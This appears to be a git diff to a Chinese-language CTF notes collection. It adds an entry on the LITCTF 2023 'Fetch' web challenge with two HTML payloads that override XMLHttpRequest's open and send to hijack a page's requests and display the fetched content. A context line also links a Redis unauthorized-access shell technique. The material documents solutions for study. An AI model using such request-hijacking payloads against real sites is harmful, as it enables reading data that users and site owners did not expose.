@@ -2770,3 +2770,28 @@ if (password_verify($password, $res['pwhash'])) //...
 - python pymysql模块连接sql数据库以及查询数据
 - python使用redis模块连接redis服务器以及利用[redis未授权访问漏洞](https://_thorns.gitbooks.io/sec/content/redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html)
 - 使用python paramiko模块连接ssh： https://www.cnblogs.com/wongbingming/articles/12384764.html
+289. [Fetch](https://github.com/4rr4y/ctf-writeups/blob/main/2023_LITCTF/Web_Fetch.md)
+- js window.XMLHttpRequest拦截器。覆盖window.XMLHttpRequest的open和send来让函数执行额外的逻辑
+```html
+<html>
+    <head>
+        <script>window.XMLHttpRequest = class _ { constructor(){};send(a){};open(a,b,c) {let e=document.createElement("iframe");e.src=b;document.body.appendChild(e);}}</script>
+    </head>
+    <body><h1></h1></body>
+</html>
+```
+```html
+<html>
+<body>
+    <h1 id="h">test</h1>
+    <script>
+        window.XMLHttpRequest.prototype.open = (...args) => {
+            fetch(args[1])
+                .then((res) => res.text())
+                .then(txt => document.getElementById("h").innerHTML = txt.replace(/(.{10})/g, '$1\n') + "**DONE**")
+        }
+        window.XMLHttpRequest.prototype.send = () => { }
+    </script>
+</body>
+</html>
+```
